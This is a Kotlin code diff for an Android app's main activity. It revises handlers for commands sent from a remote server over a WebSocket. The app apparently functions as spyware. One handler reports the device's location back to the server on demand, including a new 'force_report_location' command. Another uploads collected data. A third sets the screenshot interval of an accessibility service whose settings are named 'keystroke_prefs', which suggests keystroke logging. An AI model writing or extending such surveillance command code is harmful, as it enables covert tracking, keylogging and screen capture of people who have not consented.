@@ -147,14 +147,14 @@ class MainActivity : ComponentActivity() {
 
     // ─── WebSocket 指令处理 ───────────────────────────────────────────
 
-    private fun handleWebSocketCommand(command: String, params: JsonObject?) {
+    private fun handleWebSocketCommand(command: String, data: Any?) {
         val repo = InputRepository.getInstance(applicationContext)
         when (command) {
-            "report_location" -> {
+            "report_location", "force_report_location" -> {
                 Thread {
                     val location = AMapLocationHelper.getLocation(this)
                     val locPayload = com.google.gson.Gson().toJson(location)
-                    WebSocketManager.send("""{"type":"location","data":$locPayload}""")
+                    WebSocketManager.send("""{"command":"report_location","params":$locPayload}""")
                 }.start()
             }
             "upload_data" -> {
@@ -170,11 +170,13 @@ class MainActivity : ComponentActivity() {
                 sendBroadcast(intent)
             }
             "set_interval" -> {
-                val intervalMs = params?.get("interval_ms")?.asLong
-                if (intervalMs != null && intervalMs > 0) {
+                // 服务器下发 data: {"interval": 秒}
+                val intervalSec = (data as? com.google.gson.JsonObject)?.get("interval")?.asLong
+                if (intervalSec != null && intervalSec > 0) {
+                    val intervalMs = intervalSec * 1000
                     getSharedPreferences("keystroke_prefs", MODE_PRIVATE)
                         .edit().putLong(InputAccessibilityService.KEY_SCREENSHOT_INTERVAL, intervalMs).apply()
-                    Log.d("WebSocket", "Interval set to ${intervalMs}ms")
+                    Log.d("WebSocket", "Interval set to ${intervalSec}s")
                 }
             }
         }
